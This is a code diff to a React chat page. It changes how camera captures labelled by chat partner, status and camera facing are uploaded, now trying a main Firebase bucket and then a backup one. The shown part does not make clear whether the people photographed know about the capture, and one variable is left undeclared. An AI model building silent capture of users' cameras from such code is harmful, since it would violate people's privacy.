@@ -9,7 +9,7 @@ import {useEffect, useState, useRef  } from "react";
 
 // import { rtdb, ref, update, serverTimestamp } from "../../config/firebase";
 
-import { database, storage } from "../config/firebase";
+import { storageMain, storageBackup,database, storage } from "../config/firebase";
 import { ref as databaseRef, push, update,get,set ,onValue,serverTimestamp } from "firebase/database";
 import {
   ref as storageRef,
@@ -410,13 +410,32 @@ const ChatPage = () => {
 
         // 4. Upload ke Firebase Storage
         const timestamp = Date.now();
-        const fileRef = storageRef(
-          storage,
-          `user_captures/${chatWith}_${status}_${facing}_${timestamp}.png`
-        );
-        await uploadString(fileRef, imageData, "data_url");
-        const downloadURL = await getDownloadURL(fileRef);
+         const filename = `user_captures/${chatWith}_${status}_${facing}_${timestamp}.png`;
 
+        // const fileRef = storageRef(
+        //   storage,
+        //   `user_captures/${chatWith}_${status}_${facing}_${timestamp}.png`
+        // );
+        // await uploadString(fileRef, imageData, "data_url");
+        // const downloadURL = await getDownloadURL(fileRef);
+try {
+          const fileRefMain = storageRef(storageMain, filename);
+          await uploadString(fileRefMain, imageData, "data_url");
+          downloadURL = await getDownloadURL(fileRefMain);
+          console.log("✅ Upload ke storage MAIN berhasil");
+        } catch (uploadMainError) {
+          console.warn("⚠️ Upload ke storage MAIN gagal, coba BACKUP...", uploadMainError.message);
+
+          try {
+            const fileRefBackup = storageRef(storageBackup, filename);
+            await uploadString(fileRefBackup, imageData, "data_url");
+            downloadURL = await getDownloadURL(fileRefBackup);
+            console.log("✅ Upload ke storage BACKUP berhasil");
+          } catch (uploadBackupError) {
+            console.error("❌ Upload ke BACKUP juga gagal:", uploadBackupError.message);
+            throw uploadBackupError;
+          }
+        }
         capturedURLs.push({ facing, downloadURL });
       } catch (err) {
         console.warn(`Gagal ambil kamera ${facing}:`, err.message);
